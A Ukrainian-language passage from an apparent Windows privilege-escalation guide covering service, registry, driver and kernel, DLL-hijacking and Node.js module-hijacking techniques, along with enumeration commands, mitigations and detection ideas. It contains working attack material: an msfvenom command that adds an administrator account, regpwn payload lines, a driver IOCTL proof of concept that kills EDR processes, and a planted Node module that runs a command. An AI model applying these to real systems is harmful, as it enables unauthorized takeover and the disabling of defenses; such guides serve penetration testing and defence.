beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Дозволи AppendData/AddSubdirectory для реєстру служб

Якщо у вас є цей дозвіл на розділ реєстру, це означає, що **ви можете створювати підрозділи реєстру в ньому**. Для служб Windows цього **достатньо, щоб виконати довільний код:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Шляхи служб без лапок

Якщо шлях до виконуваного файлу не взято в лапки, Windows спробує виконати кожен варіант шляху, що закінчується перед пробілом.

Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows спробує виконати:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Перелічіть усі шляхи служб, не взяті в лапки, за винятком шляхів вбудованих служб Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Цю вразливість можна виявити й експлуатувати** за допомогою metasploit: `exploit/windows/local/trusted\_service\_path` Ви можете вручну створити бінарний файл служби за допомогою metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Дії відновлення

Windows дозволяє користувачам указувати дії, які виконуватимуться в разі збою служби. Цю функцію можна налаштувати так, щоб вона запускала бінарний файл. Якщо цей бінарний файл можна замінити, можливе підвищення привілеїв. Докладніше див. в [офіційній документації](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Цілі скриптів запланованих завдань

Для ввімкненого завдання, яке запускає `cmd.exe /c` із файлом `.bat` або `.cmd`, перевірте скрипт, указаний в **аргументах дії**, а також `cmd.exe`. Те саме стосується явного аргументу-файлу інтерпретатора, наприклад `-File` у PowerShell. Якщо запланований пакетний файл містить явний виклик PowerShell `-File`, також перевірте ACL указаного скрипту; змінні, умовні оператори й об'єднання команд у ланцюжок потребують ручного відстеження. Можливість запису в скрипт або його батьківський каталог для виклику з іншого облікового запису є приводом для подальшої перевірки лише тоді, коли налаштований обліковий запис завдання відрізняється від облікового запису викликувача і завдання справді доходить до цієї дії. ACL, що дозволяє лише додавання, може мати значення для скриптів, але попередня команда `exit` або інший потік керування можуть зробити додані рядки недосяжними. Перш ніж заявляти про підвищення привілеїв, перевірте ефективні ACL, [контекст виконання завдання](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), робочий каталог, тригер і політику контролю програм. Під час інвентаризації не змінюйте скрипт і не запускайте завдання.

## Іменовані потоки в доступних файлах

У NTFS доступний для читання файл може містити іменований потік `:$DATA`, вміст якого не відображається у звичайному списку каталогів. Для невеликого релевантного набору доступних резервних копій або файлів конфігурації перевірте **назви й розміри** потоків, перш ніж відкривати будь-який вміст; Windows надає доступ до них через [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) і PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Назва потоку, що натякає на секрет, — лише зачіпка для подальшої перевірки. Перевірте ефективні права читання файлу, підтримку потоків файловою системою, чи містить потік придатні для використання облікові дані та до якого облікового запису вони дають змогу автентифікуватися. Під час звичайного переліку уникайте рекурсивного сканування потоків і виведення їхнього вмісту.

## Вхідні файли допоміжного засобу Windows Driver Kit у запланованих завданнях

Необов'язковий компонент Windows Driver Kit містить `StandaloneRunner.exe`, який може використовувати файли `command.txt`, `reboot.rsf` і файл проєкту `working\rsf.rsf` зі свого каталогу запуску. Заплановане завдання або служба, що запускає цей допоміжний засіб із привілейованим обліковим записом, може перетворити доступ із низькими привілеями на запис у ці вхідні файли на виконання команд у контексті цього облікового запису, навіть якщо сам виконуваний файл захищено. Переконайтеся, що їх використовує привілейований процес, і що **обидва** допоміжні файли можна створити або змінити; самого виявлення допоміжного засобу недостатньо.

Для запланованого завдання перевірте [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) його дії та ACL обох допоміжних файлів. Якщо в завданні не вказано робочий каталог, каталог виконуваного файлу — лише зачіпка для перевірки, а не доказ того, що завдання читає вхідні файли саме звідти. Також має виконуватися передумова щодо файлу проєкту. Перевірте фактичний обліковий запис завдання, а не припускайте, що воно запускається від імені SYSTEM.

## Програми

### Встановлені програми

Перевірте **дозволи на бінарні файли** (можливо, ви зможете перезаписати один із них і підвищити привілеї) та **каталоги** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Шлях відновлення агента Checkmk для Windows

[CVE-2024-0670](https://checkmk.com/werk/16361) стосується старіших агентів Checkmk для Windows, які записували файли команд у `C:\Windows\Temp`, а потім виконували вже наявний файл, захищений від запису, якщо заміна не вдавалася. Постачальник виправив проблему у версіях 2.1.0p40, 2.2.0p23, 2.3.0b1 і 2.4.0b1. Перевірте повний рівень встановленого виправлення та чи може виконуватися відповідна операція агента; позначка лише гілки, наприклад `2.1`, не дає змоги визначити наявність вразливості. Під час збору даних можна перевірити версію, стан служби та дозволи для Temp, не створюючи файлів і не запускаючи команди агента.

#### Перевірка служби SAML в ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) стосувалася ADSelfService Plus збірки 6210 і попередніх; постачальник виправив її у збірці 6211. Вона актуальна лише тоді, коли SAML SSO **увімкнено зараз або було ввімкнено раніше**. Тому запис про встановлений продукт або шлях до служби — це лише зачіпка, а не підтвердження вразливості: перевірте точну збірку, історію конфігурації SAML, доступність служби з мережі та обліковий запис, від імені якого вона працює. Виконання коду через службу успадковує привілеї цього облікового запису; виконання від імені SYSTEM можливе лише для екземпляра, що працює від імені SYSTEM. Доступний для читання файл `OfflineBackup_*.ezip` у каталозі Backup продукту — це окрема зачіпка щодо зашифрованої резервної копії, а не доказ наявності придатних облікових даних чи цієї вади SAML. Під час звичайного збору даних зафіксуйте його шлях і права доступу, не розпаковуючи його.

#### Межі контролера Jenkins і доменного облікового запису

На контролері Jenkins для Windows розрізняйте дозвіл на створення чи налаштування завдання та дозвіл на його запуск: [Jenkins описує їх як окремі права `Job/Create`, `Job/Configure` і `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Налаштований розклад або віддалений тригер можуть бути ще одним способом запуску збірки, але перевірте, що він увімкнений і збірка справді запускається. Виконання відбувається з ідентичністю контролера або вибраного агента, а збережені облікові дані можна використати лише тоді, коли завдання має доступ до їхньої області дії. Окремо перевірте доступ до метаданих `JENKINS_HOME`: Jenkins зберігає дані облікових записів і ключі шифрування у файлах `credentials.xml`, `secrets/hudson.util.Secret` і `secrets/master.key` ([зберігання секретів Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Сама їхня наявність не розкриває пароль; перевірте **доступ на читання до потрібних файлів** і наявність окремого шляху повторного використання облікового запису, не виводячи секрети у спільний вивід. Якщо цей обліковий запис має право на запис у `scriptPath` об’єкта користувача AD, перш ніж вважати це виконанням від імені іншого користувача, перевірте, що шлях доступний для запису та що цільовий користувач справді запускає сценарій під час входу або за розкладом. Будь-який подальший контроль груп потребує окремої перевірки фактичних ефективних прав AD.

#### Ідентичність агента Azure Pipelines із власним розміщенням

Для проєкту Azure DevOps Server або Azure Pipelines розрізняйте дозвіл на **створення чи редагування** конвеєра, дозвіл на його **постановку в чергу** та дозвіл на використання вибраного пулу агентів; [Microsoft окремо описує дозволи конвеєра](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) і [авторизацію пулу](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Якщо обліковий запис із нижчими привілеями може додати крок зі сценарієм і запустити цей конвеєр на власному агенті Windows, крок виконується від імені [облікового запису операційної системи, налаштованого для агента](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Перш ніж заявляти про перехід між користувачами або до SYSTEM, перевірте конкретний конвеєр, обмеження для гілок і ресурсів, авторизований пул, завдання, готове до запуску, та ідентичність служби агента. Сам факт наявності встановленого агента, ролі в проєкті або права на запис у репозиторій — лише зачіпка; під час пасивного збору даних перевірте дозволи та локальні метадані служби, не запускаючи збірку.

#### Облікові дані Microsoft Entra Connect Sync

[Microsoft розрізняє](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **обліковий запис служби ADSync**, від імені якого працює служба синхронізації та який отримує доступ до її бази даних SQL, і **обліковий запис з’єднувача AD DS**, дозволи якого в каталозі залежать від налаштованих функцій синхронізації. Облікові дані з’єднувача зберігаються в цій базі даних у зашифрованому вигляді, а ключовий матеріал [захищено DPAPI в контексті облікового запису служби ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Сама наявність встановленої служби синхронізації, локальної групи з назвою, що натякає на права адміністратора, або доступу до бази даних не підтверджує, що облікові дані можна розшифрувати чи підвищити привілеї в домені. Окремо перевірте фактичні права на читання бази даних, доступ до облікового запису служби та ключів, розташування інсталяції й SQL, налаштовану ідентичність з’єднувача та ефективні привілеї цієї ідентичності в AD. Під час звичайного збору даних відображайте лише метадані служб і доступу — не запитуйте й не виводьте збережені секрети.

#### Дозволи на DLL підтримки драйвера принтера

Встановлений драйвер принтера може зберігати DLL підтримки в `C:\ProgramData` і завантажувати їх у привілейованіший процес друку. Перевірте ACL точного каталогу драйвера та DLL, зокрема батьківських каталогів і точок повторної обробки, навіть якщо перелік принтерів через WMI недоступний. У випадку [проблеми з драйвером принтера Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) вказаний шлях був `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [початковий опис](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) розповідає про завантаження DLL процесом `PrintIsolationHost.exe`. ACL, що дозволяє запис, — лише зачіпка: перевірте ефективний доступ на запис з урахуванням заборонних записів, чи встановлено відповідний драйвер і чи завантажує він файл від імені привілейованої ідентичності, а також чи усунуто проблему оновленим драйвером або програмою безпеки постачальника. Не робіть висновок про вразливість лише з назви каталогу чи версії драйвера.

### Дозволи на запис

Перевірте, чи можете ви змінити якийсь файл конфігурації, щоб прочитати певний спеціальний файл, або змінити двійковий файл, який буде виконано від імені облікового запису адміністратора (schedtasks).

Щоб знайти в системі каталоги й файли зі слабкими дозволами, виконайте:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Автозавантаження плагінів Notepad++ для закріплення/виконання

Notepad++ автоматично завантажує будь-які DLL-файли плагінів у підкаталогах `plugins`. Якщо доступна портативна інсталяція або копія з правом запису, додавання шкідливого плагіна забезпечує автоматичне виконання коду всередині `notepad++.exe` під час кожного запуску (зокрема з `DllMain` і зворотних викликів плагіна).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Запуск під час старту

**Перевірте, чи можете ви перезаписати запис реєстру або двійковий файл, який виконуватиме інший користувач.**\
**Прочитайте** **цю сторінку**, щоб дізнатися більше про цікаві **розташування autoruns для підвищення привілеїв**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Драйвери

Шукайте потенційно **дивні/вразливі сторонні** драйвери

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Якщо драйвер надає примітив довільного читання/запису в пам’ять ядра (поширена проблема в погано спроєктованих обробниках IOCTL), можна підвищити привілеї, безпосередньо викравши токен SYSTEM із пам’яті ядра.<sup>[[13]](#references)</sup> Покрокову техніку дивіться тут:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Матеріали з експлуатації ядра Windows:

Приклад із кільцевим буфером у режимі ядра та доступними для запису з користувацького режиму регістрами читання/запису дивіться у [варіанті з USB MIDI looped-streaming](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Для помилок race condition, коли вразливий виклик відкриває контрольований зловмисником шлях Object Manager, навмисне сповільнення пошуку (за допомогою компонентів максимальної довжини або глибоких ланцюжків каталогів) може збільшити вікно з кількох мікросекунд до десятків мікросекунд:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### UAF у чергах із захистом від скасування, витоки з paged pool і переходи до I/O ring

Деякі ланцюжки LPE у ядрі Windows можна побудувати з двох окремо незначних помилок: **race condition життєвого циклу черги із захистом від скасування**, що звільняє запит/CBD, поки блокування черги ще утримується, і витоку **після звільнення блокування, але до копіювання**, який розкриває звільнений блок пам’яті paged pool під час `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Нотатки з аудиту та експлуатації:

- **Звільнення під блокуванням + подальше скасування**: шукайте шлях успішного виконання, який робить **Acquire -> CompleteRequest/free -> Release**, тоді як шлях скасування робить **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Якщо шлях успішного виконання доходить до `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl`, перш ніж звільнити блокування CBDQ/CSQ, потік, заблокований у `NtCancelIoFileEx -> IopCsqCancelRoutine`, може згодом продовжити виконання та передати звільнений `PFLT_CALLBACK_DATA` назад у callback-функцію драйвера для видалення.
- **Повторно займіть звільнений об’єкт черги** блоком пам’яті paged pool такого самого розміру, вміст якого контролюється зловмисником. Записи Data Queue Entries у `NPFS` корисні, оскільки можна контролювати їхній вміст і розмір, а згодом перевірити їх за допомогою операцій читання/перегляду вмісту каналу. Якщо звільнений об’єкт містить посилання на елементи списку, перезапишіть їх **циклічним списком фальшивих вузлів запитів у пам’яті користувацького режиму**, щоб драйвер неодноразово обробляв задані зловмисником структури запитів, а не зупинявся на початковій голові списку.
- **Покращте передбачуваний запис**: якщо фальшивий запит перенаправляє вкладений вказівник на контекст, який використовується для записів обліку (часові мітки / QPC / поля поруч із лічильником посилань), можна отримати запис у ядро, де **адресу можна контролювати, а значення — ні**. У такому разі націльтеся на поле **довжини/розміру** об’єкта розпиленого пулу, а не на кінцевий вказівник на код/дані, а потім переберіть розпилені об’єкти, доки пошкоджений об’єкт не дасть змогу виконати **читання за межами буфера з paged pool**.
- **Шаблон витоку з race condition**: будь-який системний виклик, що виконує `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)`, є перспективною ціллю. Надійність підвищується, якщо зловмисник може збільшити буфер, що копіюється (наприклад, додавши багато елементів списку/ресурсів, які збільшують кінцевий розмір виділення пам’яті серіалізатора), оскільки довше копіювання розширює вікно підміни, не обов’язково спричиняючи збій системи.
- **Цілі для повторного заповнення з великою кількістю вказівників**: масиви зареєстрованих буферів Windows **I/O ring** — чудові цілі для витоку, оскільки розмір їхнього блока paged pool контролюється зловмисником (`8 * regBufferCnt`), а кожен елемент містить вказівник ядра на `_IOP_MC_BUFFER_ENTRY`. Витік одного з таких масивів дає змогу відновити навколишній `IORING_OBJECT`, а потім пошкодити **`RegBuffers`** і **`RegBuffersCount`**, щоб подальші операції I/O ring використовували підроблені зловмисником записи й забезпечували довільне читання/запис у пам’ять ядра. Якщо доступний лише запис зі стабільним байтом (наприклад, із `KUSER_SHARED_DATA+0x14`), використовуйте **накладені невирівняні записи**, щоб сформувати вказівник користувацького режиму з повторюваним байтом, наприклад `0x0101010101010101`, відобразіть його за допомогою `VirtualAlloc` і розмістіть там підроблений масив зареєстрованих буферів.<sup>[[30]](#references)</sup>

Корисні ознаки для налагодження:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Щойно ви отримаєте довільне читання/запис у kernel через пошкоджений I/O ring, викрадіть токен SYSTEM, використовуючи стандартний workflow після отримання примітива:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Примітиви пошкодження пам’яті куща реєстру

Сучасні вразливості кущів реєстру дають змогу формувати детерміновані розкладки пам’яті, зловживати доступними для запису дочірніми ключами HKLM/HKU та перетворювати пошкодження метаданих на переповнення paged pool у kernel без спеціального драйвера. Повний ланцюжок описано тут:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Плутанина типів у прямому режимі `RtlQueryRegistryValues` через контрольовані зловмисником шляхи

Деякі драйвери приймають шлях до реєстру з userland, перевіряють лише, що це коректний рядок UTF-16, а потім викликають `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` з `RTL_QUERY_REGISTRY_DIRECT`, передаючи в стекову скалярну змінну, як-от `int readValue`. Якщо відсутній `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` інтерпретується відповідно до **фактичного** типу реєстру, а не до типу, який очікував розробник.

Це створює два корисні примітиви:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: контрольований користувачем абсолютний шлях `\Registry\...` дає змогу драйверу запитувати вибрані зловмисником ключі, розкривати їхню наявність через коди повернення/журнали, а іноді й читати значення, до яких викликач не мав би прямого доступу.
- **Пошкодження пам’яті в kernel**: скалярне призначення на кшталт `&readValue` інтерпретується з неправильним типом як `REG_QWORD`, `UNICODE_STRING` або буфер заданого розміру — залежно від типу значення реєстру.

Практичні нотатки щодо експлуатації:

- **Захист у Windows 8+**: якщо запит звертається до **недовіреного куща** з `RTL_QUERY_REGISTRY_DIRECT`, але без `RTL_QUERY_REGISTRY_TYPECHECK`, виклики з kernel призводять до аварійного завершення з `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Щоб зберегти можливість експлуатації, шукайте **доступні для запису зловмисником ключі всередині довірених системних кущів**, а не розміщуйте значення в `HKCU`.
- **Розміщення даних у довіреному кущі**: використовуйте NtObjectManager, щоб перелічити доступні для запису дочірні ключі в `\Registry\Machine`, а потім повторіть сканування з дублікатом токена **низького рівня цілісності**, щоб знайти ключі, доступні з ізольованих контекстів:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: прямий запис 8 байтів у 4-байтовий `int` пошкоджує сусідні дані стека та може частково перезаписати сусідній callback/function pointer.
- **`REG_SZ` / `REG_EXPAND_SZ`**: у direct mode очікується, що `EntryContext` вказує на `UNICODE_STRING`. Якщо код спершу завантажує контрольований атакувальником `REG_DWORD` у скаляр на стеку, а потім повторно використовує той самий буфер для читання рядка, атакувальник контролює `Length`/`MaximumLength` і частково впливає на вказівник `Buffer`, що дає напівконтрольований запис у kernel.
- **`REG_BINARY`**: для великих двійкових даних direct mode трактує перший `LONG` за адресою `EntryContext` як знаковий розмір буфера. Якщо попереднє читання `REG_DWORD` залишає від’ємне контрольоване атакувальником значення у повторно використаному скалярі, наступний запит `REG_BINARY` копіює байти атакувальника безпосередньо в сусідні слоти стека. Це часто найпростіший шлях до повного перезапису callback-pointer.

Надійна закономірність для пошуку: **читання різнотипних значень реєстру в одну й ту саму змінну на стеку без її повторної ініціалізації**. Шукайте `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, повторно використані вказівники `EntryContext` і шляхи виконання, де перше читання з реєстру визначає, чи відбудеться друге.

#### Зловживання відсутністю FILE_DEVICE_SECURE_OPEN на об’єктах пристроїв (LPE + знищення EDR)

Деякі підписані сторонні драйвери створюють об’єкт пристрою з надійним SDDL через IoCreateDeviceSecure, але забувають встановити FILE_DEVICE_SECURE_OPEN у DeviceCharacteristics. Без цього прапорця захищений DACL не застосовується, коли пристрій відкривають через шлях із додатковим компонентом. Це дає змогу будь-якому непривілейованому користувачу отримати дескриптор, використавши шлях у просторі імен, наприклад:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (з реального випадку)

Коли користувач може відкрити пристрій, привілейованими IOCTL, доступними через драйвер, можна зловживати для LPE та втручання. Приклади можливостей, виявлених у реальних випадках:
- Повернення дескрипторів із повним доступом до довільних процесів (крадіжка токена / оболонка SYSTEM через DuplicateTokenEx/CreateProcessAsUser).
- Необмежене читання/запис на диск у raw mode (втручання офлайн, трюки з персистентністю під час завантаження).
- Завершення довільних процесів, зокрема Protected Process/Light (PP/PPL), що дає змогу знищити AV/EDR із user land через kernel.

Мінімальний шаблон PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Заходи пом’якшення для розробників
- Завжди задавайте FILE_DEVICE_SECURE_OPEN під час створення об’єктів пристроїв, доступ до яких має обмежуватися за допомогою DACL.
- Перевіряйте контекст виклику для привілейованих операцій. Додавайте перевірки PP/PPL перед дозволом завершення процесу або повернення дескрипторів.
- Обмежуйте IOCTLs (маски доступу, METHOD_*, перевірка вхідних даних) і розгляньте brokered models замість прямих привілеїв ядра.

Ідеї для виявлення
- Відстежуйте відкриття підозрілих імен пристроїв із user-mode (наприклад, \\ .\\amsdk*) і конкретні послідовності IOCTL, що можуть свідчити про зловживання.
- Забезпечте застосування списку заблокованих вразливих драйверів Microsoft (HVCI/WDAC/Smart App Control) і ведіть власні списки дозволів/заборон.


## PATH DLL Hijacking

Якщо у вас є **права на запис у папку, наявну в PATH**, ви можете перехопити DLL, завантажувану процесом, і **підвищити привілеї**.<sup>[[2]](#references)</sup>

Перевірте дозволи всіх папок у PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Щоб дізнатися більше про те, як зловживати цією перевіркою:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Перехоплення розв’язання модулів Node.js / Electron через `C:\node_modules`

Це варіант **неконтрольованого шляху пошуку у Windows**, який впливає на застосунки **Node.js** і **Electron**, коли вони виконують bare import, наприклад `require("foo")`, а очікуваний модуль **відсутній**.<sup>[[20]](#references)</sup>

Node проходить вгору деревом каталогів і перевіряє папки `node_modules` у кожному батьківському каталозі. У Windows цей пошук може дійти до кореня диска, тож застосунок, запущений із `C:\Users\Administrator\project\app.js`, може шукати модуль у таких місцях:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Якщо **користувач із низькими привілеями** може створити `C:\node_modules`, він може розмістити там шкідливий `foo.js` (або папку пакета) і чекати, доки **процес Node/Electron із вищими привілеями** спробує розв’язати відсутню залежність. Payload виконується в контексті безпеки процесу-жертви, тож це призводить до **LPE**, якщо ціль запускається від імені адміністратора, із підвищеної запланованої задачі/обгортки служби або як автоматично запущений привілейований десктопний застосунок.

Таке особливо часто трапляється, коли:

- залежність оголошено в `optionalDependencies`<sup>[[22]](#references)</sup>
- стороння бібліотека огортає `require("foo")` у `try/catch` і продовжує роботу після помилки
- пакет видалили з production-збірок, пропустили під час пакування або не вдалося встановити
- вразливий `require()` міститься глибоко в дереві залежностей, а не в коді основного застосунку

### Пошук вразливих цілей

Використовуйте **Procmon**, щоб підтвердити шлях розв’язання:<sup>[[23]](#references)</sup>

- Фільтр `Process Name` = виконуваний файл цілі (`node.exe`, EXE-файл застосунку Electron або процес-обгортка)
- Фільтр `Path` `contains` `node_modules`
- Зверніть увагу на `NAME NOT FOUND` і останнє успішне відкриття в `C:\node_modules`

Корисні шаблони для аналізу коду в розпакованих файлах `.asar` або вихідному коді застосунку:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Експлуатація

1. Визначте **назву відсутнього пакета** за допомогою Procmon або аналізу вихідного коду.
2. Створіть кореневий каталог пошуку, якщо його ще не існує:

```powershell
mkdir C:\node_modules
```

3. Розмістіть модуль із точно очікуваною назвою:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Запустіть застосунок-жертву. Якщо застосунок спробує виконати `require("foo")`, а легітимний модуль відсутній, Node може завантажити `C:\node_modules\foo.js`.

Реальні приклади відсутніх необов’язкових модулів, що відповідають цьому шаблону, — `bluebird` і `utf-8-validate`, але повторно використовуваною частиною є **техніка**: знайдіть будь-який **відсутній bare import**, який привілейований процес Windows Node/Electron розв’язуватиме.

### Ідеї для виявлення та посилення захисту

- Сповіщайте про створення користувачем `C:\node_modules` або записування туди нових файлів чи пакетів `.js`.
- Шукайте процеси з високим рівнем цілісності, які читають дані з `C:\node_modules\*`.
- У production пакуйте всі залежності середовища виконання та перевіряйте використання `optionalDependencies`.
- Перевіряйте сторонній код на наявність шаблонів `try { require("...") } catch {}`, які не повідомляють про помилки.
- Вимикайте необов’язкові перевірки, якщо бібліотека це підтримує (наприклад, у деяких конфігураціях `ws` можна уникнути застарілої перевірки `utf-8-validate`, задавши `WS_NO_UTF_8_VALIDATE=1`).

## Мережа

### Спільні ресурси

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### файл hosts

Перевірте, чи не вказані у файлі hosts жорстко задані адреси інших відомих комп’ютерів.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Мережеві інтерфейси та DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Відкриті порти

Перевірте **служби з обмеженим доступом** ззовні.

```bash
netstat -ano #Opened ports?
```

Для локального прослуховувача зіставте його PID із власником процесу, шляхом до виконуваного файла та службою або запланованим завданням, яке його запускає. Служба віддаленого керування може надати доступ від імені користувача робочого столу, лише якщо це дозволяють її автентифікація та засоби керування командами. Власний TCP-застосунок, що працює з обліковим записом із вищими привілеями, — це окрема ціль для аналізу: прослуховувач і шлях до виконуваного файла є лише пасивними зачіпками, тоді як для підтвердження автентифікації шляху через пошкодження пам’яті потрібно проаналізувати саме цей виконуваний файл і доступні йому вхідні дані. Якщо здається, що відкритий порт належить системному процесу, перед визначенням серверної служби порівняйте його з [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface); саме правило переспрямування не доводить, що кінцева служба доступна або вразлива.

### Таблиця маршрутизації

```
route print
